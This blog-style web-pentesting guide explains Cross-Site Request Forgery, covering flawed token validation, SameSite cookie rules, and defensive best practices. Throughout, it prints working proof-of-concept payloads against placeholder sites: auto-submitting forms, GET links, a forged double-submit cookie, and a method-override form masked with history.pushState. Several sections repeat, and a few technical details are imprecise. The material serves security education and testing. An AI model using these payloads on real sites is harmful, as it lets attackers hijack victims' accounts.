---
title: "Guide to Cross-Site Request Forgery (CSRF)"
date: 2025-02-23
categories: [Guides, Web Pentesting]
tags: [Guides, CSRF, Web Pentesting]
permalink: /posts/csrf-guide
image:
  path: /assets/img/thumbnails/csrf-guide.png
---




# Introduction to Cross-Site Request Forgery (CSRF)

## What is Cross-Site Request Forgery (CSRF)?

Cross-Site Request Forgery (CSRF) is a web security vulnerability that tricks users into performing actions they didn't intend to. It exploits the trust that a website has in a user's browser, allowing an attacker to perform unauthorized actions on behalf of an authenticated user without their knowledge.

CSRF attacks bypass the **same-origin policy**, which is meant to prevent websites from interfering with each other, by forcing the user to make unintended requests to a site they are already authenticated on. This can lead to actions such as changing account settings, transferring money, or other malicious activities without the user's consent.


---

## **How Does CSRF Work?**

For a CSRF attack to be successful, three key conditions must be met:

1. **A Relevant Action**:  
   The attacker must have a reason to induce an action within the application, such as modifying user permissions or changing the user's password. This action is often privileged or tied to user-specific data.

2. **Cookie-Based Session Handling**:  
   The application must rely solely on session cookies to authenticate and identify the user. If the application uses cookies to track the session, the attacker can exploit this to make unauthorized requests on behalf of the user.

3. **No Unpredictable Request Parameters**:  
   The action the attacker wants to induce must not require any parameters that are difficult or impossible for the attacker to guess. For example, if an attacker wants to change a user's password, the function would be vulnerable if the attacker doesn't need to know the user's current password.

---

### Example Scenario

Consider an example where an application lets users change their email address. The request to change the email might look like this:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

This scenario meets the conditions for a CSRF attack:

1. **Relevant Action**:  
   The attacker is interested in changing the user's email, which could then lead to further control, such as triggering a password reset and gaining full access to the account.

2. **Cookie-Based Session Handling**:  
   The request uses a session cookie to authenticate the user, and the application doesn’t have any other mechanisms, like anti-CSRF tokens, to validate the request. The browser automatically sends the session cookie with the request.

3. **Predictable Parameters**:  
   The attacker can easily guess or know the request parameters required for the action (in this case, the new email address), allowing them to craft a malicious request.

---

### Malicious HTML Example

With these conditions in place, the attacker can construct a web page containing the following HTML:

```html
<form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

If a victim user visits the attacker's web page, the following steps will occur:

1. **Triggering the Request**:  
   The attacker's page will automatically trigger an HTTP request to the vulnerable website (e.g., the email change request).

2. **Automatic Session Inclusion**:  
   If the user is already logged in to the vulnerable website, their browser will automatically include the session cookie with the request (assuming the SameSite cookie attribute isn't in use).

3. **Processing the Request**:  
   The vulnerable website will treat the request as if it were made by the victim user, process it normally, and carry out the action, such as changing the email address.

---

**Note**: While CSRF is often described in the context of cookie-based session handling, it can also apply in other cases where the application automatically includes user credentials in requests, such as in **HTTP Basic authentication** or **certificate-based authentication**. In these scenarios, attackers can exploit the same trust the website places in the user's credentials to perform unauthorized actions.




# Constructing and Delivering CSRF Attacks

## **How to Construct a CSRF Attack**

Manually creating the HTML needed for a CSRF exploit can be cumbersome, especially when the desired request contains a large number of parameters or has quirks in its structure. Fortunately, tools like **Burp Suite Professional** and other free alternatives make it easier to generate CSRF exploits.

### Steps to Construct a CSRF Exploit:

1. **Select a Request**:  
   In Burp Suite Professional, select any request you want to test or exploit.
   
2. **Generate CSRF PoC**:  
   From the right-click context menu, select **Engagement tools / Generate CSRF PoC**. Burp Suite will generate HTML that triggers the selected request (minus cookies, which are automatically added by the victim's browser).

3. **Fine-Tune the Attack**:  
   You can tweak various options in the CSRF PoC generator to handle unusual features of the request, such as custom headers or specific parameter formats.

4. **Test the Exploit**:  
   Copy the generated HTML into a web page, view it in a browser logged into the vulnerable website, and verify whether the intended request is issued successfully and the desired action occurs.

---

### Free Tools for CSRF Exploits

While **Burp Suite Professional** is a popular tool for generating CSRF exploits, there are free alternatives that work similarly:

- **CSRFShark**: [https://csrfshark.github.io/](https://csrfshark.github.io/)  
  - Simply copy the request from Burp Suite and paste it into CSRFShark, choosing HTTP/HTTPS depending on the website's restrictions.

- **Nakanosec CSRF Tool**: [https://tools.nakanosec.com/csrf/](https://tools.nakanosec.com/csrf/)  
  - Another free tool that generates CSRF exploits based on HTTP requests.

---

### Example CSRF Exploit Code

Here’s an example of a simple CSRF exploit using HTML:

```html
<form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

When a victim visits this page, their browser will automatically submit the form, triggering the malicious request to change their email address.

---

## **How to Deliver a CSRF Exploit**

The delivery mechanisms for CSRF attacks are quite similar to those for reflected XSS attacks. Below are common methods attackers use to deliver CSRF exploits:

### 1. **Hosting Malicious HTML**
The attacker hosts the malicious HTML on a website they control. When victims visit the site, their browsers automatically send the malicious request to the vulnerable website.

### 2. **Inducing Victims to Visit**
Attackers encourage victims to visit the malicious website by sending links via email, social media, or embedding the attack in high-traffic websites (e.g., user comment sections).

### 3. **Self-Contained GET Method Exploits**
Some CSRF exploits use the **GET method** and can be fully contained within a single URL on the vulnerable website. In these cases, the attacker doesn’t need to rely on an external site and can directly send victims a malicious URL.

For example, if changing an email address can be done via a GET request, the exploit might look like this:

```http
https://vulnerable-website.com/email/change?email=pwned@evil-user.net
```

When the victim visits this URL, their browser sends the malicious request to the vulnerable website.

---

## **Common Defenses Against CSRF**

Successfully exploiting CSRF vulnerabilities typically requires bypassing anti-CSRF measures. Below are the most common defenses used to protect against CSRF attacks:

### 1. **CSRF Tokens**
A **CSRF token** is a unique, secret, and unpredictable value generated by the server and shared with the client. For sensitive actions (like submitting a form), the client must include the correct CSRF token in the request. This makes it difficult for attackers to forge a valid request.

#### Example of CSRF Token in an HTML Form:

```html
<form action="/my-account/change-email" method="POST">
    <input type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <input type="email" name="email" value="example@normal-website.com">
    <button type="submit">Update email</button>
</form>
```

When the form is submitted, the request includes the CSRF token:

```http
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

If the token is missing or incorrect, the server rejects the request.

---

### 2. **SameSite Cookies**
**SameSite** is a browser security feature that controls when cookies are sent with cross-site requests. Since actions requiring authenticated session cookies are often vulnerable to CSRF, setting SameSite restrictions (e.g., Lax or Strict) can block attackers from triggering actions from other websites.

- **Strict**: Cookies are only sent in a first-party context, meaning they won't be included in any cross-site requests.
- **Lax**: Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests (e.g., images or iframes).
- **None**: Cookies are sent with all requests, including cross-site ones, but must be marked as "Secure" (i.e., transmitted over HTTPS).

#### Example of Setting a SameSite Cookie:

```http
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

---

### 3. **Referer-Based Validation**
Some applications use the **Referer** header to check if a request originates from the application's own domain. This prevents cross-site requests, but it's generally less effective than CSRF token validation because the Referer header can be manipulated or blocked by the victim’s browser.

---

## **Bypassing SameSite Lax Restrictions Using GET Requests**

Even with **Lax** SameSite restrictions, attackers can still perform CSRF attacks if the server allows **GET requests** to trigger sensitive actions. For example:

```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

In this case, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform malicious actions (like changing the email) without being detected.

---

### Example of Bypassing CSRF Token Validation

If the application validates the CSRF token only if it is present in the request, attackers can exploit this by simply removing the token parameter from the request. For example:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net # THE CSRF TOKEN IS REMOVED HERE
```

Since the CSRF token is not present, and if the application doesn’t enforce checks for the missing token, the attacker can still perform the malicious action.




# Common Flaws in CSRF Token Validation and Advanced Bypass Techniques

## **Common Flaws in CSRF Token Validation**

Even when applications implement CSRF tokens, improper validation can render the defense ineffective. Below are some common flaws that attackers can exploit to bypass CSRF protection:

---

### 1. **Validation of CSRF Token Depends on Request Method**

In some applications, CSRF token validation is only enforced when the request uses the **POST** method but is skipped for **GET** requests. This can lead to vulnerabilities because GET requests can still modify user data or perform sensitive actions without triggering token checks.

#### Example Exploit:
An attacker can exploit this by switching to the **GET method**, which doesn’t trigger token validation. For example, the following request could bypass CSRF protection:

```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

Here, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform a malicious action (like changing the email) without being detected.

---

### 2. **Validation of CSRF Token Depends on Token Being Present**

Another common flaw occurs when applications validate the CSRF token **only if it is present** in the request. If the token is omitted, some applications may skip validation entirely.

#### Example Exploit:
An attacker can exploit this vulnerability by simply removing the token parameter from the request. Since no token is included, the application may fail to validate the absence of the token, allowing the attacker to carry out a CSRF attack.

For example, an attacker could send the following request, omitting the CSRF token:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net # THE CSRF TOKEN IS REMOVED HERE
```

Since the CSRF token is not present, and if the application doesn't enforce any checks for the missing token, the attacker can still perform the malicious action, such as changing the user's email address, without being blocked.

---

### 3. **CSRF Token is Not Tied to the User Session**

A critical flaw in some applications is the failure to ensure that the CSRF token belongs to the same session as the user making the request. Instead of validating that the token is unique to the user session, the application may accept any token from a global pool of previously issued tokens.

#### How the Attack Works:
1. The attacker logs into the application with their own account, obtaining a valid CSRF token tied to their session.
2. The attacker then creates a malicious CSRF request and includes the valid token obtained from their own session.
3. The attacker sends this request to a victim, hoping the victim will unknowingly trigger the request while logged into the vulnerable application.
4. Because the application only checks if the CSRF token is valid (without verifying whether it matches the victim's session), the attack can succeed, allowing the attacker to perform actions on behalf of the victim.

#### Example:
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=victim-session-id

csrf=attacker-csrf-token&email=pwned@evil-user.net
```

---

### 4. **CSRF Token is Tied to a Non-Session Cookie**

In some cases, instead of tying the CSRF token to the session (which is secure), the application ties the CSRF token to a **different cookie** that is not used for session tracking. This can happen when:

1. The application uses separate frameworks for session management and CSRF protection.
2. These frameworks are not properly integrated, so they don’t share the same session state.

#### Example Request:
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

- The `session` cookie (`pSJYSScWKpmC60LpFOAHKixuFuM4uXWF`) tracks the user's session.
- The `csrfKey` cookie (`rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv`) is used to validate the CSRF token (`RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY`).

Notice that the CSRF token is validated against the `csrfKey` cookie, **not the session cookie**.

#### Why Is This Vulnerable?
This setup is vulnerable because the CSRF token is no longer tightly coupled with the user's session. Instead, it depends on a separate cookie (`csrfKey`). If an attacker can manipulate this cookie, they can bypass the CSRF protection.

#### How Can an Attacker Exploit This?
1. **Obtain a Valid CSRF Token and Associated Cookie:**
   - The attacker logs into their own account on the application.
   - They obtain a valid CSRF token and its corresponding `csrfKey` cookie.
   
2. **Set the Attacker's `csrfKey` Cookie in the Victim's Browser:**
   - If the application has any functionality that allows setting cookies (e.g., via JavaScript, HTTP headers, or another subdomain), the attacker can exploit this to set their `csrfKey` cookie in the victim's browser.
   - For example:
     - A cookie-setting function on `staging.demo.normal-website.com` could set a cookie that is submitted to `secure.normal-website.com`.
     - The attacker leverages this behavior to place their `csrfKey` cookie in the victim's browser.
   
3. **Craft a Malicious CSRF Request:**
   - The attacker creates a malicious request (e.g., changing the victim's email address) and includes their valid CSRF token.
   - When the victim's browser sends the request, it includes:
     - The attacker's `csrfKey` cookie (set earlier).
     - The attacker's valid CSRF token (included in the malicious request).
   
4. **Bypass CSRF Protection:**
   - The server validates the CSRF token against the `csrfKey` cookie.
   - Since both the token and cookie belong to the attacker, the validation passes.
   - The server processes the request as if it came from the victim, even though the victim did not intend to perform the action.

---

### 5. **CSRF Token is Simply Duplicated in a Cookie**

In a variation of the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF.

#### Example Request:
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

#### Why Is This Vulnerable?
The attacker can again perform a CSRF attack if the website contains any cookie-setting functionality. Here, the attacker doesn’t need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

#### Example Exploit:
```html
<script>
    document.cookie = "csrf=abcd1234";
</script>
<form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="csrf" value="abcd1234">
    <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

---

## **Advanced Techniques for Bypassing CSRF Defenses**

### 1. **Bypassing SameSite Lax Restrictions Using GET Requests**

Even with **Lax** SameSite restrictions, attackers can still perform CSRF attacks if the server allows **GET requests** to trigger sensitive actions. For example:

```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

In this case, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform malicious actions (like changing the email) without being detected.

---

### 2. **Using `history.pushState` to Mask the Attack**

Attackers can use the `history.pushState` function to modify the browser's URL history and mask the attack. This can help avoid detection by users or security tools.

#### Example Exploit:
```html
<script>
    history.pushState('', '', '/');
</script>
<form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```




# SameSite Cookie Restrictions and Bypass Techniques

## **What is SameSite in the Context of Cookies?**

**SameSite** is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. It provides partial protection against a variety of cross-site attacks, including:

- **CSRF (Cross-Site Request Forgery)**
- **Cross-Site Leaks**
- **Some CORS (Cross-Origin Resource Sharing) Exploits**

Since 2021, **Chrome** applies `Lax` SameSite restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level. This is a proposed standard, and other major browsers are expected to adopt this behavior in the future. As a result, it's essential to understand how these restrictions work, as well as how they can potentially be bypassed.

---

### **How Does SameSite Work?**

SameSite allows website owners to restrict cookie sharing based on three levels:

1. **Strict**:  
   - Cookies are only sent in a first-party context, meaning they won't be included in any cross-site requests.
   - This provides the strongest protection but may break functionality for users navigating between sites.

2. **Lax**:  
   - Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests (e.g., images or iframes).
   - This offers a balance between security and usability.

3. **None**:  
   - Cookies are sent with all requests, including cross-site ones, but must be marked as "Secure" (i.e., transmitted over HTTPS).

By limiting when cookies are sent, SameSite reduces the risk of CSRF attacks, where attackers trick a user's browser into making unauthorized requests using their authenticated session.

---

#### **Setting SameSite Attributes**

Developers can manually configure a restriction level for each cookie they set by including the `SameSite` attribute in the `Set-Cookie` response header, along with their preferred value:

```http
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

If the website issuing the cookie doesn't explicitly set a `SameSite` attribute, Chrome automatically applies `Lax` restrictions by default. This means that the cookie is only sent in cross-site requests that meet specific criteria, even though the developers never configured this behavior.

---

### **Bypassing SameSite Lax Restrictions Using GET Requests**

Even with **Lax** SameSite restrictions, attackers can still perform CSRF attacks if the server allows **GET requests** to trigger sensitive actions. For example:

```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

In this case, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform malicious actions (like changing the email) without being detected.

---

### **Using `_method` Parameter to Override HTTP Methods**

Some frameworks allow overriding the HTTP method specified in the request line. For example, **Symfony** supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes.

#### Example Exploit:

```html
<script>
    history.pushState('', '', '/');
</script>
<form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

Here’s what happens in this exploit:

1. **`history.pushState`**:  
   - The `history.pushState` function modifies the browser's history and URL without reloading the page. In this case, it changes the URL path to `/`, which may help mask the attack or avoid detection.

2. **Form Action**:  
   - The form's `action` attribute points to the target endpoint: `https://vulnerable-website.com/email/change`.
   - This is the URL where the malicious request will be sent.

3. **Hidden Input Fields**:  
   - The form includes hidden input fields:
     - `_method`: Overrides the HTTP method to `GET` (useful if the server accepts method overrides).
     - `email`: Sets the victim's email to `pwned@evil-user.net`.

4. **Automatic Submission**:  
   - The JavaScript at the end (`document.forms[0].submit();`) automatically submits the form when the page loads, making the attack seamless and invisible to the user.

---

### **Bypassing SameSite with Top-Level Navigation**

If the application uses **Lax** SameSite restrictions, cookies are still sent during **top-level navigation** (e.g., clicking a link). Attackers can exploit this by crafting a malicious link that triggers a sensitive action via a `GET` request.

#### Example:

```html
<a href="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">Click here!</a>
```

When the victim clicks the link, their browser sends the request with their session cookie, allowing the attacker to change the victim's email address.

---

### **Bypassing SameSite with Cookie Injection**

If an attacker can inject cookies into the victim's browser (e.g., via subdomains or JavaScript), they can bypass SameSite restrictions. For example:

1. **Injecting a Malicious Cookie**:  
   An attacker could use JavaScript to set a cookie on a subdomain:

   ```javascript
   document.cookie = "session=attacker-session-id; domain=.example.com; path=/";
   ```

2. **Crafting a Malicious Request**:  
   The attacker then creates a malicious request that includes the injected cookie:

   ```http
   POST /email/change HTTP/1.1
   Host: vulnerable-website.com
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 68
   Cookie: session=attacker-session-id

   email=pwned@evil-user.net
   ```

---

### **What is a Site in the Context of SameSite Cookies?**

In the context of SameSite cookie restrictions, a **site** is defined as the **top-level domain (TLD)** plus one additional level of the domain name (often referred to as **TLD+1**). For example:

- `example.com` → TLD+1
- `app.example.com` → Subdomain of TLD+1

When determining whether a request is **same-site** or not, the **URL scheme** is also taken into consideration. This means that a link from `http://app.example.com` to `https://app.example.com` is treated as **cross-site** by most browsers.


---

### **Difference Between a Site and an Origin**

The difference between a **site** and an **origin** lies in their scope:

- A **site** encompasses multiple domain names.
- An **origin** only includes one specific domain.

Two URLs are considered to have the **same origin** if they share the exact same **scheme**, **domain name**, and **port**.

| **Request From**               | **Request To**                | **Same-Site?** | **Same-Origin?** |
|--------------------------------|-------------------------------|----------------|------------------|
| `https://example.com`          | `https://example.com`         | Yes            | Yes              |
| `https://app.example.com`      | `https://intranet.example.com`| Yes            | No: mismatched domain name |
| `https://example.com`          | `https://example.com:8080`    | Yes            | No: mismatched port |
| `https://example.com`          | `https://example.co.uk`       | No: mismatched eTLD | No: mismatched domain name |
| `https://example.com`          | `http://example.com`          | No: mismatched scheme | No: mismatched scheme |

This distinction is crucial because any vulnerability enabling arbitrary JavaScript execution can be abused to bypass site-based defenses on other domains belonging to the same site.

---

### **Conclusion**

While **SameSite cookies** provide a strong layer of protection against CSRF attacks, they are not foolproof. Attackers can still bypass these restrictions in certain scenarios, such as:

- Using **GET requests** to trigger sensitive actions.
- Leveraging **top-level navigation** to include cookies.
- Injecting malicious cookies into the victim's browser.

Understanding how SameSite works and how it can be bypassed is essential for both developers and security professionals to ensure robust protection against CSRF and other cross-site attacks.




# Summary and Best Practices for Defending Against CSRF

## **Summary of CSRF Vulnerabilities**

Cross-Site Request Forgery (CSRF) is a web security vulnerability that tricks users into performing actions they didn't intend to. It exploits the trust that a website has in a user's browser, allowing an attacker to perform unauthorized actions on behalf of an authenticated user without their knowledge.

### Key Points:
1. **How CSRF Works**:
   - CSRF attacks bypass the **same-origin policy** by forcing users to make unintended requests to a site where they are already authenticated.
   - The browser automatically includes session cookies with these requests, making it appear as though the user initiated the action.

2. **Conditions for a Successful CSRF Attack**:
   - **Relevant Action**: The attacker must have a reason to induce an action within the application (e.g., changing account settings).
   - **Cookie-Based Session Handling**: The application must rely solely on session cookies to authenticate and identify the user.
   - **No Unpredictable Request Parameters**: The action must not require any parameters that are difficult or impossible for the attacker to guess.

3. **Common Flaws in CSRF Token Validation**:
   - **Validation Depends on Request Method**: Some applications only enforce CSRF token validation for `POST` requests but skip it for `GET` requests.
   - **Validation Depends on Token Being Present**: If the token is omitted, some applications may skip validation entirely.
   - **Token Not Tied to User Session**: If the token is validated against a global pool of tokens rather than the user's session, attackers can exploit this.
   - **Token Tied to Non-Session Cookie**: If the token is tied to a cookie other than the session cookie, attackers can manipulate this cookie to bypass CSRF protection.
   - **Double Submit Cookie**: If the token is duplicated in both a cookie and a request parameter, attackers can exploit cookie-setting functionality to bypass CSRF defenses.

4. **SameSite Cookies**:
   - **Strict**: Cookies are only sent in first-party contexts.
   - **Lax**: Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests.
   - **None**: Cookies are sent with all requests, including cross-site ones, but must be marked as "Secure."

---

## **Best Practices for Defending Against CSRF**

To protect your web application from CSRF attacks, follow these best practices:

### 1. **Use CSRF Tokens**
   - **What Are CSRF Tokens?**  
     A CSRF token is a unique, secret, and unpredictable value generated by the server and shared with the client. For sensitive actions (like submitting a form), the client must include the correct CSRF token in the request.
   
   - **How to Implement CSRF Tokens**:  
     Embed the CSRF token as a hidden input field in HTML forms or include it in HTTP headers for AJAX requests.

   ```html
   <form action="/my-account/change-email" method="POST">
       <input type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
       <input type="email" name="email" value="example@normal-website.com">
       <button type="submit">Update email</button>
   </form>
   ```

   - **Effectiveness**:  
     When implemented correctly, CSRF tokens make it extremely difficult for attackers to forge valid requests because they cannot predict or guess the token.

---

### 2. **Implement SameSite Cookies**
   - **Why Use SameSite Cookies?**  
     SameSite cookies help prevent CSRF attacks by controlling when cookies are sent with cross-site requests. By default, Chrome applies `Lax` restrictions, but you should explicitly set the `SameSite` attribute for better control.

   - **How to Set SameSite Cookies**:  
     Include the `SameSite` attribute in the `Set-Cookie` response header:

     ```http
     Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
     ```

   - **Levels of SameSite Restrictions**:
     - **Strict**: Cookies are only sent in first-party contexts.
     - **Lax**: Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests.
     - **None**: Cookies are sent with all requests, including cross-site ones, but must be marked as "Secure."

---

### 3. **Validate the Referer Header**
   - **How It Works**:  
     Some applications use the **Referer** header to check if a request originates from the application's own domain. This prevents cross-site requests, but it's generally less effective than CSRF token validation because the Referer header can be manipulated or blocked by the victim’s browser.

   - **Limitations**:  
     While this method can add an extra layer of defense, it should not be relied upon as the sole protection against CSRF. Always combine it with other measures like CSRF tokens.

---

### 4. **Avoid Using GET Requests for Sensitive Actions**
   - **Why Avoid GET Requests?**  
     GET requests are more vulnerable to CSRF attacks because they can be triggered via simple links or embedded resources (e.g., images). Always use `POST` (or other HTTP methods like `PUT` or `DELETE`) for actions that modify data or state.

   - **Example**:  
     Instead of allowing email changes via a `GET` request:

     ```http
     GET /email/change?email=pwned@evil-user.net HTTP/1.1
     Host: vulnerable-website.com
     ```

     Require a `POST` request with proper CSRF token validation:

     ```http
     POST /email/change HTTP/1.1
     Host: vulnerable-website.com
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 70
     Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

     csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
     ```

---

### 5. **Educate Users About Security Risks**
   - **User Awareness**:  
     Educate users about the risks of clicking on suspicious links or visiting untrusted websites. Encourage them to log out of sensitive applications when not in use and to use browser extensions that block malicious scripts.

   - **Browser Security Features**:  
     Modern browsers offer features like **SameSite cookies** and **Content Security Policy (CSP)** that can help mitigate CSRF attacks. Ensure your application takes full advantage of these features.

---

### 6. **Regularly Test for CSRF Vulnerabilities**
   - **Penetration Testing**:  
     Regularly test your application for CSRF vulnerabilities using tools like **Burp Suite**, **CSRFShark**, or **Nakanosec CSRF Tool**. These tools can help identify weaknesses in your CSRF defenses.

   - **Automated Scanning**:  
     Use automated security scanners to detect potential CSRF vulnerabilities in your application. However, manual testing is often necessary to uncover more complex issues.

---

## **Conclusion**

CSRF attacks remain a significant threat to web applications, especially when proper defenses like CSRF tokens and SameSite cookies are not implemented correctly. Understanding how these attacks work and how to defend against them is crucial for securing modern web applications.

### **Key Takeaways**:
1. **CSRF tokens** are one of the most effective ways to prevent CSRF attacks. Ensure that tokens are tightly coupled with user sessions and validated on every sensitive request.
2. **SameSite cookies** provide an additional layer of protection by controlling when cookies are sent with cross-site requests. Use `Strict` or `Lax` restrictions wherever possible.
3. **Avoid using GET requests** for sensitive actions, and always validate the Referer header as an extra precaution.
4. **Regularly test** your application for CSRF vulnerabilities and stay informed about new attack techniques and defenses.
